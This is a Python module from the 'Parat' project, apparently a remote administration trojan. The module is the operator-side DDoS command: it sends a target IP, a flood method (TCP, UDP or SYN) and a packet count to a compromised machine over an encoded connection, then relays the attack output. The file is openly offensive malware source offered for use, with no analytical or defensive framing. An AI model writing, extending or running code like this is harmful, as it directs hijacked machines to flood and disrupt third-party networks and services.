#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import argparse
from lib.ParatPrint import colorize, pprint
from lib.ParatEncrypt import Encode, Decode
from time import sleep


class ParatDDOS:


    def __init__(self, conn, args, colors):

        self.helps   = ["-h", "--help"]
        self.handler = "#DATA_HANDLER"
        self.conn    = conn
        self.colors  = colors
        self.args    = args


    def prepare_basics(self):

        self.parser = argparse.ArgumentParser(
            prog         = "modules.DDoser",
            usage        = "dos -i/--ip ADDRESS -m/--method METHOD [-n/--number NUMBER]",
            description  = "small tool for ddos attacks"
        )

        self.parser.add_argument(
            '-i', '--ip',
            required     = True,
            help         = "target ip address"
        )
        self.parser.add_argument(
            '-m', '--method',
            required     = True,
            choices      = ["tcp", "udp", "syn"],
            help         = "attack method"
        )
        self.parser.add_argument(
            '-n', '--packets',
            type         = int,
            default      = 500,
            metavar      = "NUMBER",
            help         = "packet(s) number to send"
        )


    def start(self):

        if self.args is None or len(self.args) == 0 or self.args[0] in self.helps:
            self.parser.print_help()

        else:

            try:

                argument = self.parser.parse_args(self.args)

                self.conn.send(Encode(
                    " ".join(["dos", argument.ip, argument.method, str(argument.packets)])
                ))
                attack_result = Decode(self.conn.recv(4096))

                while attack_result:

                    for line in attack_result.split("\n"):
                        pprint(line + '\n')
                        sleep(.03)

                    attack_result = Decode(self.conn.recv(4096))

                    if self.handler in attack_result:
                        pprint(
                            colorize(
                                "Attack stoppetd!\n\n",
                                colored=self.colors,
                                status="WAR"
                            )
                        ); break
            except:
                pass
